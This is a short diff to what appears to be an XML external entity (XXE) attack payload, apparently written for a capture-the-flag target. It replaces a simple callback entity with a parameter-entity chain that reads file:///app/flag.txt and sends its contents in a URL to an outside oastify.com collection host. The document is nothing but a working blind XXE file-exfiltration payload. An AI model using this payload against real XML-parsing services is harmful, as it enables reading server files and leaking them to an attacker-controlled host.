@@ -1,2 +1,4 @@
-<!ENTITY % trigger SYSTEM "http://cm22br02fz1d4ohx0a62myerdij97cv1.oastify.com">
-%trigger;
+<!ENTITY % file SYSTEM "file:///app/flag.txt">
+<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://whhm6bvmajwxz8chvu1mhi9b82eu2kq9.oastify.com/?x=%file;'>">
+%eval;
+%exfiltrate;
